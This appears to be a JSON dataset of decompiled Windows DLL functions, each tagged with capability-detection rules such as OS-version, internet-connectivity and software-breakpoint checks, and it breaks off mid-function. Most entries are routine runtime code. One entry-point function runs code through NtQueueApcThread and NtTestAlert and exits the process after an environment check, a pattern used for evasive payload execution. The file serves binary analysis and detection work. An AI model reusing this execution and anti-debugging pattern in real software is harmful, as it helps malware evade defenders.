{
    "18000147": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180001470(ulong noname_0, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint uVar6;\n    ulong uVar7;\n    uint uVar9;\n    double dVar8;\n    double dVar10;\n    uchar auStack104 [32];\n    ulong lppt;\n    ulong X;\n    ulong nXEnd;\n    ulong var_28h;\n    ulong var_20h;\n    uint64_t var_18h;\n    \n    var_18h = *0x180071010 ^ auStack104;\n    uVar3 = (*_sym.imp.GDI32.dll_CreatePen)(0, 1, *(*0x180073894 * 4 + 0x180068028));\n    uVar4 = (*_sym.imp.GDI32.dll_SelectObject)();\n    X._0_4_ = *0x180073878 * *0x180073880 * *0x1800680f8;\n    lppt._0_4_ = *0x180073878 * *0x180073880 * *0x180068128;\n    nXEnd._4_4_ = *0x18007387c * *0x180073880 * *0x1800680f8;\n    lppt._4_4_ = *0x18007387c * *0x180073880 * *0x180068128;\n    var_20h = CONCAT44(lppt._4_4_, lppt);\n    X._4_4_ = lppt._4_4_;\n    nXEnd._0_4_ = X;\n    var_28h._0_4_ = lppt;\n    var_28h._4_4_ = nXEnd._4_4_;\n    uVar7 = fcn.180012de0(*0x180073888);\n    uVar6 = uVar7;\n    uVar9 = uVar7 >> 0x20;\n    dVar8 = fcn.180012870(*0x180073888);\n    iVar5 = 0;\n    do {\n        iVar2 = *(&lppt + iVar5);\n        dVar10 = *(&lppt + iVar5 * 8 + 4);\n        *(&lppt + iVar5) = iVar2 * CONCAT44(uVar9, uVar6) + dVar10 * dVar8;\n        *(&lppt + iVar5 * 8 + 4) = dVar10 * CONCAT44(uVar9, uVar6) - iVar2 * dVar8;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    iVar5 = 0;\n    do {\n        *(&lppt + iVar5) = *(&lppt + iVar5) + *0x180073870;\n        piVar1 = &lppt + iVar5 * 8 + 4;\n        *piVar1 = *piVar1 + *0x180073874;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    (*_sym.imp.GDI32.dll_Polyline)(arg2, &lppt, 5);\n    if (*0x180073890 != '\\0') {\n        (*_sym.imp.GDI32.dll_MoveToEx)(arg2, lppt, lppt._4_4_, 0);\n        (*_sym.imp.GDI32.dll_LineTo)(arg2, nXEnd, nXEnd._4_4_);\n        (*_sym.imp.GDI32.dll_MoveToEx)(arg2, X, X._4_4_, 0);\n        (*_sym.imp.GDI32.dll_LineTo)(arg2, var_28h, var_28h._4_4_);\n    }\n    (*_sym.imp.GDI32.dll_SelectObject)(arg2, uVar4);\n    (*_sym.imp.GDI32.dll_DeleteObject)(uVar3);\n    fcn.180002200(var_18h ^ auStack104);\n    return;\n}\n",
        "token_count": 905
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "18004256": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.180042568(ulong noname_0, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    uint64_t uVar8;\n    uint8_t *puVar9;\n    ushort *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uchar auStack104 [32];\n    int32_t iStack72;\n    uint8_t auStack66 [18];\n    uint64_t uStack48;\n    \n    uStack48 = *0x180071010 ^ auStack104;\n    uVar3 = fcn.180041e3c(noname_0);\n    uVar11 = 0;\n    if (uVar3 != 0) {\n        puVar5 = 0x180071650;\n        uVar13 = 1;\n        uVar8 = uVar11;\ncode_r0x0001800425b1:\n        if (*puVar5 != uVar3) goto code_r0x0001800425b9;\n        fcn.180004940(arg2 + 0x18, 0, 0x101);\n        puVar16 = 0x180071640;\n        iVar6 = 4;\n        puVar7 = uVar8 * 0x30 + 0x180071660;\n        do {\n            uVar2 = *puVar7;\n            puVar9 = puVar7;\n            while ((uVar2 != 0 && (puVar9[1] != 0))) {\n                uVar2 = *puVar9;\n                uVar15 = uVar2;\n                if (uVar2 <= puVar9[1]) {\n                    uVar14 = uVar2;\n                    do {\n                        uVar14 = uVar14 + 1;\n                        if (0x100 < uVar14) break;\n                        uVar15 = uVar15 + 1;\n                        puVar1 = uVar14 + 0x18 + arg2;\n                        *puVar1 = *puVar1 | *puVar16;\n                    } while (uVar15 <= puVar9[1]);\n                }\n                puVar9 = puVar9 + 2;\n                uVar2 = *puVar9;\n            }\n            puVar7 = puVar7 + 8;\n            puVar16 = puVar16 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        *(arg2 + 4) = uVar3;\n        *(arg2 + 8) = 1;\n        uVar12 = *0x1800609d0;\n        if (((uVar3 != 0x3a4) && (uVar12 = *0x1800609d8,  uVar3 != 0x3a8)) &&\n           ((uVar12 = *0x1800609e0,  uVar3 != 0x3b5 && (uVar12 = uVar11,  uVar3 == 0x3b6)))) {\n            uVar12 = *0x1800609e8;\n        }\n        *(arg2 + 0x220) = uVar12;\n        puVar10 = arg2 + 0xc;\n        iVar6 = 6;\n        do {\n            *puVar10 = *((uVar8 * 0x30 - arg2) + 0x180071648 + puVar10);\n            puVar10 = puVar10 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        goto code_r0x00018004260d;\n    }\ncode_r0x0001800427f5:\n    fcn.180041ecc(arg2);\ncode_r0x0001800427ff:\n    fcn.180002200(uStack48 ^ auStack104);\n    return;\ncode_r0x0001800425b9:\n    uVar15 = uVar8 + 1;\n    uVar8 = uVar15;\n    puVar5 = puVar5 + 0xc;\n    if (4 < uVar15) goto code_r0x0001800425c6;\n    goto code_r0x0001800425b1;\ncode_r0x0001800425c6:\n    if ((uVar3 == 65000) || (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(uVar3 & 0xffff),  iVar4 == 0))\n    goto code_r0x0001800427ff;\n    if (uVar3 == 0xfde9) {\n        *(arg2 + 4) = 0xfde9;\n        *(arg2 + 0x220) = 0;\n        *(arg2 + 0x18) = 0;\n        *(arg2 + 0x1c) = 0;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar3);\n        if (iVar4 == 0) {\n            if (*0x1800729c8 == 0) goto code_r0x0001800427ff;\n            goto code_r0x0001800427f5;\n        }\n        fcn.180004940(arg2 + 0x18, 0, 0x101);\n        *(arg2 + 4) = uVar3;\n        *(arg2 + 0x220) = 0;\n        if (iStack72 == 2) {\n            puVar7 = auStack66;\n            while ((auStack66[0] != 0 && (puVar7[1] != 0))) {\n                uVar2 = *puVar7;\n                if (uVar2 <= puVar7[1]) {\n                    uVar3 = uVar2;\n                    uVar8 = (puVar7[1] - uVar2) + 1;\n                    do {\n                        uVar3 = uVar3 + 1;\n                        puVar16 = uVar3 + 0x18 + arg2;\n                        *puVar16 = *puVar16 | 4;\n                        uVar8 = uVar8 - 1;\n                    } while (uVar8 != 0);\n                }\n                puVar7 = puVar7 + 2;\n                auStack66[0] = *puVar7;\n            }\n            puVar7 = arg2 + 0x1a;\n            iVar6 = 0xfe;\n            do {\n                *puVar7 = *puVar7 | 8;\n                puVar7 = puVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            iVar4 = *(arg2 + 4);\n            uVar8 = *0x1800609d0;\n            if ((((iVar4 != 0x3a4) && (uVar8 = *0x1800609d8,  iVar4 != 0x3a8)) &&\n                (uVar8 = *0x1800609e0,  iVar4 != 0x3b5)) && (uVar8 = *0x1800609e8,  iVar4 != 0x3b6)) {\n                uVar8 = uVar11;\n            }\n            *(arg2 + 0x220) = uVar8;\n        }\n        else {\n            uVar13 = 0;\n        }\n        *(arg2 + 8) = uVar13;\n    }\n    puVar10 = arg2 + 0xc;\n    for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\ncode_r0x00018004260d:\n    fcn.180041f64(arg2);\n    goto code_r0x0001800427ff;\n}\n",
        "token_count": 1795
    },
    "18005018": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180050188(ulong *arg1, ulong arg2, uint8_t *arg3, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint uVar3;\n    int64_t iVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    uint64_t uVar11;\n    int64_t arg3_00;\n    ulong arg3_01;\n    char *pcVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    uchar *in_stack_00000028;\n    uchar auStack280 [32];\n    uchar *puStack248;\n    uint uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    uint16_t uStack216;\n    uint uStack212;\n    uint32_t uStack208;\n    uint8_t *puStack200;\n    uint64_t uStack192;\n    uint32_t uStack184;\n    int32_t iStack180;\n    int64_t iStack176;\n    uchar *puStack168;\n    uint8_t *puStack160;\n    ulong uStack152;\n    char *pcStack144;\n    uint8_t *puStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    int64_t iStack112;\n    uint64_t uStack104;\n    ulong uStack96;\n    char acStack88 [8];\n    uint8_t uStack80;\n    uint8_t uStack79;\n    uchar auStack72 [8];\n    uint64_t uStack64;\n    \n    uStack96 = 0xfffffffffffffffe;\n    uStack64 = *0x180071010 ^ auStack280;\n    iStack112 = arg2;\n    puStack168 = in_stack_00000028;\n    iVar4 = iStack112 >> 6;\n    uVar6 = arg2 & 0x3f;\n    uStack128 = *(*(iVar4 * 8 + 0x180072bb0) + 0x28 + uVar6 * 0x48);\n    puStack200 = arg3 + (arg4 & 0xffffffff);\n    iStack176 = iVar4;\n    puStack160 = arg3;\n    uStack104 = uVar6;\n    uStack184 = (*_sym.imp.KERNEL32.dll_GetConsoleOutputCP)();\n    uVar11 = 0;\n    if (in_stack_00000028[0x28] == '\\0') {\n        fcn.180015220(in_stack_00000028);\n    }\n    iStack180 = *(*(in_stack_00000028 + 0x18) + 0xc);\n    *arg1 = 0;\n    *(arg1 + 1) = 0;\n    uVar7 = uVar11;\n    if (puStack160 < arg3 + (arg4 & 0xffffffff)) {\n        do {\n            iStack120 = iVar4;\n            uStack216 = uStack216 & 0xff00 | *arg3;\n            uStack212 = 0;\n            uVar14 = 1;\n            if (iStack180 == 0xfde9) {\n                pcVar12 = uVar6 * 0x48 + 0x3e + *(iStack120 * 8 + 0x180072bb0);\n                pcVar5 = pcVar12;\n                uVar7 = uVar11;\n                uVar14 = uVar11;\n                do {\n                    uVar8 = uVar7;\n                    if (*pcVar5 == '\\0') break;\n                    uVar8 = uVar8 + 1;\n                    uVar7 = uVar8;\n                    uVar14 = uVar14 + 1;\n                    pcVar5 = pcVar5 + 1;\n                } while (uVar14 < 5);\n                if (uVar14 == 0) {\n                    cVar2 = *(*arg3 + 0x180071960);\n                    iVar13 = cVar2 + 1;\n                    iVar4 = puStack200 - arg3;\n                    if (iVar4 < iVar13) {\n                        if (0 < iVar4) {\n                            uVar6 = uVar11;\n                            do {\n                                *(*((iStack112 >> 6) * 8 + 0x180072bb0) + uStack104 * 0x48 + 0x3e + uVar11) =\n                                     arg3[uVar11];\n                                uVar8 = uVar6 + 1;\n                                uVar6 = uVar8;\n                                uVar11 = uVar11 + 1;\n                            } while (uVar8 < iVar4);\n                        }\n                        *(arg1 + 4) = *(arg1 + 4) + iVar4;\n                        break;\n                    }\n                    uStack192 = 0;\n                    uVar8 = (iVar13 == 4) + 1;\n                    puStack248 = puStack168;\n                    puStack136 = arg3;\n                    iVar4 = fcn.180054c7c(&uStack212, &puStack136, uVar8, &uStack192);\n                    if (iVar4 == -1) break;\n                    uVar14 = uVar8;\n                    puVar10 = arg3 + cVar2;\n                    in_stack_00000028 = puStack168;\n                }\n                else {\n                    iVar13 = *(*(*(iStack176 * 8 + 0x180072bb0) + 0x3e + uVar6 * 0x48) + 0x180071960) + 1;\n                    uVar8 = iVar13 - uVar8;\n                    uStack192 = uStack192 & 0xffffffff00000000 | uVar8;\n                    iVar4 = puStack200 - arg3;\n                    arg3_00 = uVar8;\n                    uVar7 = uVar11;\n                    if (iVar4 < arg3_00) {\n                        if (0 < iVar4) {\n                            uVar7 = uVar14;\n                            do {\n                                *(*(iStack176 * 8 + 0x180072bb0) + uVar7 + 0x3e + uVar6 * 0x48) = arg3[uVar7 - uVar14];\n                                uVar8 = uVar11 + 1;\n                                uVar11 = uVar8;\n                                uVar7 = uVar7 + 1;\n                            } while (uVar8 < iVar4);\n                        }\n                        *(arg1 + 4) = *(arg1 + 4) + iVar4;\n                        break;\n                    }\n                    do {\n                        acStack88[uVar7] = *pcVar12;\n                        uVar7 = uVar7 + 1;\n                        pcVar12 = pcVar12 + 1;\n                    } while (uVar7 < uVar14);\n                    uVar7 = uVar11;\n                    if (0 < arg3_00) {\n                        fcn.1800121f0(acStack88 + uVar14, arg3, arg3_00);\n                    }\n                    do {\n                        *(*(iStack176 * 8 + 0x180072bb0) + uVar7 + 0x3e + uVar6 * 0x48) = 0;\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < uVar14);\n                    uStack152 = 0;\n                    pcStack144 = acStack88;\n                    uVar8 = (iVar13 == 4) + 1;\n                    uVar14 = uVar8;\n                    puStack248 = in_stack_00000028;\n                    iVar4 = fcn.180054c7c(&uStack212, &pcStack144, uVar8, &uStack152);\n                    if (iVar4 == -1) break;\n                    puVar10 = arg3 + (uStack192 + -1);\n                }\n            }\n            else {\n                iVar4 = *(iStack176 * 8 + 0x180072bb0);\n                uVar1 = *(iVar4 + 0x3d + uVar6 * 0x48);\n                if ((uVar1 & 4) == 0) {\n                    if (*(**(in_stack_00000028 + 0x18) + *arg3 * 2) < 0) {\n                        puVar10 = arg3 + 1;\n                        if (puVar10 < puStack200) {\n                            iVar13 = fcn.1800492a8(&uStack212, arg3, 2, in_stack_00000028);\n                            if (iVar13 != -1) goto code_r0x000180050485;\n                        }\n                        else {\n                            *(iVar4 + 0x3e + uVar6 * 0x48) = *arg3;\n                            puVar10 = *(iStack176 * 8 + 0x180072bb0) + 0x3d + uVar6 * 0x48;\n                            *puVar10 = *puVar10 | 4;\n                            *(arg1 + 4) = uVar7 + 1;\n                        }\n                        break;\n                    }\n                    arg3_01 = 1;\n                    puVar10 = arg3;\n                }\n                else {\n                    uStack80 = *(iVar4 + 0x3e + uVar6 * 0x48);\n                    uStack79 = *arg3;\n                    *(iVar4 + 0x3d + uVar6 * 0x48) = uVar1 & 0xfb;\n                    arg3_01 = 2;\n                    puVar10 = &uStack80;\n                }\n                iVar13 = fcn.1800492a8(&uStack212, puVar10, arg3_01, in_stack_00000028);\n                puVar10 = arg3;\n                if (iVar13 == -1) break;\n            }\ncode_r0x000180050485:\n            arg3 = puVar10 + 1;\n            uStack224 = 0;\n            uStack232 = 0;\n            uStack240 = 5;\n            puStack248 = auStack72;\n            uVar8 = fcn.180042e48(uStack184, 0, &uStack212, uVar14);\n            if (uVar8 == 0) break;\n            puStack248 = NULL;\n            iVar13 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n            if (iVar13 == 0) {\ncode_r0x0001800505e0:\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                *arg1 = uVar3;\n                break;\n            }\n            uVar9 = (arg3 - puStack160) + *(arg1 + 1);\n            *(arg1 + 4) = uVar9;\n            if (uStack208 < uVar8) break;\n            if (uStack216 == '\\n') {\n                uStack216 = 0xd;\n                puStack248 = NULL;\n                iVar13 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                if (iVar13 == 0) goto code_r0x0001800505e0;\n                if (uStack208 == 0) break;\n                *(arg1 + 1) = *(arg1 + 1) + 1;\n                *(arg1 + 4) = *(arg1 + 4) + 1;\n                uVar9 = *(arg1 + 4);\n            }\n            uVar7 = uVar9;\n            iVar4 = iStack120;\n        } while (arg3 < puStack200);\n    }\n    fcn.180002200(uStack64 ^ auStack280);\n    return;\n}\n",
        "token_count": 2557
    },
    "180050cb": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpMode\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesWritten\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.180050cb0(ulong arg1, int16_t *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t *puVar8;\n    int64_t iVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    uint64_t arg4_00;\n    int16_t *piVar12;\n    ulong uStack112;\n    int32_t iStack104;\n    uint64_t uStack96;\n    int16_t iStack80;\n    ulong var_38h;\n    ulong lpNumberOfBytesWritten;\n    ulong var_20h;\n    ulong lpMode;\n    \n    iVar10 = 0;\n    arg4_00 = arg3;\n    uVar11 = arg1;\n    if (arg3 == 0) {\n        return 0;\n    }\n    if (arg2 == NULL) {\ncode_r0x000180050ce0:\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 0x16;\n        fcn.18003be88(0, 0, 0, 0);\n        return -1;\n    }\n    uVar7 = arg1 & 0x3f;\n    iVar9 = uVar11 >> 6;\n    iVar2 = *(iVar9 * 8 + 0x180072bb0);\n    cVar1 = *(iVar2 + 0x39 + uVar7 * 0x48);\n    if ((cVar1 - 1U < 2) && ((~arg3 & 1) == 0)) goto code_r0x000180050ce0;\n    if ((*(iVar2 + 0x38 + uVar7 * 0x48) & 0x20) != 0) {\n        fcn.180057ebc(uVar11 & 0xffffffff, 0, 2, arg4);\n    }\n    uStack96 = 0;\n    iVar5 = fcn.1800510cc(uVar11 & 0xffffffff);\n    if ((iVar5 == 0) || (-1 < *(*(iVar9 * 8 + 0x180072bb0) + 0x38 + uVar7 * 0x48))) {\ncode_r0x000180050e99:\n        iVar2 = *(iVar9 * 8 + 0x180072bb0);\n        if (-1 < *(iVar2 + 0x38 + uVar7 * 0x48)) {\n            uStack112 = 0;\n            iStack104 = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(iVar2 + 0x28 + uVar7 * 0x48), arg2, arg4_00, &uStack112 + 4, 0)\n            ;\n            iVar10 = iStack104;\n            uVar3 = uStack112;\n            if (iVar5 == 0) {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uStack112 = uStack112 & 0xffffffff00000000 | uVar6;\n                iVar10 = iStack104;\n                uVar3 = uStack112;\n            }\n            goto code_r0x000180050f3d;\n        }\n        if (cVar1 == '\\0') {\n            puVar8 = fcn.180050750(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n        else if (cVar1 == '\\x01') {\n            puVar8 = fcn.180050970(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n        else {\n            iVar10 = 0;\n            uVar3 = uStack96;\n            if (cVar1 != '\\x02') goto code_r0x000180050f3d;\n            puVar8 = fcn.180050854(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n    }\n    else {\n        if (*(arg4 + 0x28) == '\\0') {\n            fcn.180015220(arg4);\n        }\n        if (((*(*(arg4 + 0x18) + 0x138) == 0) && (*(*(iVar9 * 8 + 0x180072bb0) + 0x39 + uVar7 * 0x48) == '\\0')) ||\n           (iVar5 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(),  iVar5 == 0)) goto code_r0x000180050e99;\n        if (cVar1 != '\\0') {\n            uVar3 = uStack96;\n            if (cVar1 - 1U < 2) {\n                uStack112 = 0;\n                uVar3 = uStack112;\n                if (arg2 < arg2 + arg4_00) {\n                    uStack112._4_4_ = 0;\n                    piVar12 = arg2;\n                    do {\n                        iStack80 = *piVar12;\n                        iVar4 = fcn.180057f9c();\n                        if (iVar4 != iStack80) {\ncode_r0x000180050e5d:\n                            uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uStack112 = uStack112 & 0xffffffff00000000 | uVar6;\n                            uVar3 = uStack112;\n                            break;\n                        }\n                        uStack112 = uStack112 & 0xffffffff | uStack112._4_4_ + 2 << 0x20;\n                        uVar6 = uStack112._4_4_ + 2;\n                        if (iStack80 == 10) {\n                            iVar4 = fcn.180057f9c(0xd);\n                            if (iVar4 != 0xd) goto code_r0x000180050e5d;\n                            uStack112 = uStack112 & 0xffffffff | uStack112._4_4_ + 3 << 0x20;\n                            iVar10 = iVar10 + 1;\n                            uVar6 = uStack112._4_4_ + 3;\n                        }\n                        uStack112._4_4_ = uVar6;\n                        piVar12 = piVar12 + 1;\n                        uVar3 = uStack112;\n                    } while (piVar12 < arg2 + arg4_00);\n                }\n            }\n            goto code_r0x000180050f3d;\n        }\n        puVar8 = fcn.180050188(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n    }\n    iVar10 = *(puVar8 + 1);\n    uVar3 = *puVar8;\ncode_r0x000180050f3d:\n    uStack96 = uVar3;\n    iVar5 = uStack96 >> 0x20;\n    if (iVar5 != 0) {\n        return iVar5 - iVar10;\n    }\n    if (uStack96 != 0) {\n        if (uStack96 == 5) {\n            *(arg4 + 0x30) = 1;\n            *(arg4 + 0x2c) = 9;\n            *(arg4 + 0x38) = 1;\n            *(arg4 + 0x34) = 5;\n            return -1;\n        }\n        fcn.18003c3a4(uStack96 & 0xffffffff, arg4);\n        return -1;\n    }\n    if (((*(*(iVar9 * 8 + 0x180072bb0) + 0x38 + uVar7 * 0x48) & 0x40) != 0) && (*arg2 == '\\x1a')) {\n        return 0;\n    }\n    *(arg4 + 0x34) = 0;\n    *(arg4 + 0x30) = 1;\n    *(arg4 + 0x2c) = 0x1c;\n    *(arg4 + 0x38) = 1;\n    return -1;\n}\n",
        "token_count": 1924
    },
    "180001e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180001e88(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong uStackX32;\n    ulong auStack24 [2];\n    \n    if (arg2 == 1) {\n        uStackX32 = 0;\n        auStack24[0] = 0;\n        *0x1800736c0 = arg1;\n        iVar2 = fcn.180001d10();\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xffffa883);\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        *0x1800736c8 = 0x11be0652;\n        fcn.180001d44(0x689, auStack24);\n        fcn.180001d44(0x6bd, &uStackX32);\n        fcn.180004940(0x1800736a0, 0, 0x20);\n        *0x1800736b0 = uStackX32;\n        *0x1800736a8 = 1;\n        *0x1800736a0 = arg1;\n        (*_sym.imp.ntdll.dll_NtQueueApcThread)(0xfffffffffffffffe, auStack24[0], 0x1800736a0, 0, 0);\n        (*_sym.imp.ntdll.dll_NtTestAlert)();\n    }\n    return 1;\n}\n",
        "token_count": 348
    },
    "1800121f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuchar (*) [32] fcn.1800121f0(uchar (*arg1) [32], uchar (*arg2) [32], uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uchar (*pauVar15) [32];\n    uchar (*pauVar16) [32];\n    uchar (*pauVar17) [32];\n    uint *puVar18;\n    uint *puVar19;\n    uchar (*pauVar20) [32];\n    uint *puVar21;\n    uint64_t uVar22;\n    int64_t iVar23;\n    uint64_t uVar24;\n    uint uVar25;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uchar auVar26 [32];\n    uchar auVar30 [32];\n    uchar auVar31 [32];\n    uchar auVar32 [32];\n    uchar auVar33 [32];\n    uchar auVar34 [32];\n    \n    pauVar15 = arg1;\n    if (arg3 < 0x10) {\n    // switch table (16 cases) at 0x180079050\n        switch(*(arg3 * 4 + 0x180079050) + 0x180000000) {\n        case 0x18001221e:\n            return pauVar15;\n        case 0x180012220:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            uVar2 = (*arg2)[0xe];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            (*arg1)[0xe] = uVar2;\n            return pauVar15;\n        case 0x180012240:\n            uVar3 = *(*arg2 + 8);\n            uVar2 = (*arg2)[10];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar2;\n            return pauVar15;\n        case 0x180012258:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x180012260:\n            uVar3 = *(*arg2 + 4);\n            uVar2 = (*arg2)[6];\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            (*arg1)[6] = uVar2;\n            return pauVar15;\n        case 0x180012278:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            return pauVar15;\n        case 0x18001228f:\n            uVar2 = (*arg2)[2];\n            **arg1 = **arg2;\n            (*arg1)[2] = uVar2;\n            return pauVar15;\n        case 0x1800122a0:\n            uVar4 = *(*arg2 + 8);\n            uVar2 = (*arg2)[0xc];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            (*arg1)[0xc] = uVar2;\n            return pauVar15;\n        case 0x1800122b6:\n            uVar3 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            return pauVar15;\n        case 0x1800122c5:\n            uVar2 = (*arg2)[8];\n            **arg1 = **arg2;\n            (*arg1)[8] = uVar2;\n            return pauVar15;\n        case 0x1800122d3:\n            uVar4 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            return pauVar15;\n        case 0x1800122e0:\n            uVar3 = *(*arg2 + 4);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            return pauVar15;\n        case 0x1800122ef:\n            uVar2 = (*arg2)[4];\n            **arg1 = **arg2;\n            (*arg1)[4] = uVar2;\n            return pauVar15;\n        case 0x1800122fd:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x180012304:\n            (*arg1)[0] = (*arg2)[0];\n            return pauVar15;\n        case 0x18001230a:\n            **arg1 = **arg2;\n            return pauVar15;\n        }\n    }\n    if (arg3 < 0x21) {\n        uVar4 = *(*arg2 + 4);\n        uVar5 = *(*arg2 + 8);\n        uVar6 = *(*arg2 + 0xc);\n        puVar18 = arg2[-1] + arg3 + 0x10;\n        uVar25 = *puVar18;\n        uVar27 = puVar18[1];\n        uVar28 = puVar18[2];\n        uVar29 = puVar18[3];\n        **arg1 = **arg2;\n        *(*arg1 + 4) = uVar4;\n        *(*arg1 + 8) = uVar5;\n        *(*arg1 + 0xc) = uVar6;\n        puVar18 = arg1[-1] + arg3 + 0x10;\n        *puVar18 = uVar25;\n        puVar18[1] = uVar27;\n        puVar18[2] = uVar28;\n        puVar18[3] = uVar29;\n        return pauVar15;\n    }\n    if ((arg2 < arg1) && (arg1 < *arg2 + arg3)) {\n        iVar23 = arg2 - arg1;\n        puVar18 = arg1 + iVar23 + (arg3 - 0x10);\n        uVar4 = puVar18[1];\n        uVar5 = puVar18[2];\n        uVar6 = puVar18[3];\n        puVar19 = arg1[-1] + arg3 + 0x10;\n        uVar22 = arg3 - 0x10;\n        puVar21 = puVar19;\n        uVar25 = *puVar18;\n        uVar27 = uVar4;\n        uVar28 = uVar5;\n        uVar29 = uVar6;\n        if ((puVar19 & 0xf) != 0) {\n            puVar21 = puVar19 & 0xfffffffffffffff0;\n            puVar1 = puVar21 + iVar23;\n            uVar25 = *puVar1;\n            uVar27 = puVar1[1];\n            uVar28 = puVar1[2];\n            uVar29 = puVar1[3];\n            *puVar19 = *puVar18;\n            *(arg1[-1] + arg3 + 0x14) = uVar4;\n            *(arg1[-1] + arg3 + 0x18) = uVar5;\n            *(arg1[-1] + arg3 + 0x1c) = uVar6;\n            uVar22 = puVar21 - arg1;\n        }\n        uVar24 = uVar22 >> 7;\n        if (uVar24 != 0) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar18 = puVar21;\n            while( true ) {\n                puVar19 = puVar18 + iVar23 + -0x10;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar21 = puVar18 + 